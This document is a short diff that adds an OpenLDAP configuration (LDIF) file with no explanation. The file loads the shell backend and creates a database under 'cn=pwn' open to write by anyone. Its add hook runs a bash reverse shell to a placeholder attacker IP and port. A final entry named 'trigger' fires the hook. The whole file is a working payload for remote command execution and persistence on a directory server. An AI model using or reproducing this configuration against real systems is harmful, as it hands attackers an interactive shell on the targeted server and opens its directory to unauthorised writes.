@@ -1,0 +1,25 @@
+asdf
+
+dn: cn=module{0},cn=config
+changetype: modify
+add: olcModuleLoad
+olcModuleLoad: back_shell
+
+dn: olcBackend=shell,cn=config
+changetype: add
+objectClass: olcBackendConfig
+olcBackend: shell
+
+dn: olcDatabase={2}shell,cn=config
+changetype: add
+objectClass: olcDatabaseConfig
+objectClass: olcShellConfig
+olcDatabase: {2}shell
+olcSuffix: cn=pwn
+olcAccess: to * by * write by * break
+olcShellAdd: /bin/bash -c "/bin/bash -i >& /dev/tcp/${your-ip}/${your-port} 0>&1"
+
+dn: cn=trigger,cn=pwn
+changetype: add
+objectClass: applicationProcess
+cn: trigger
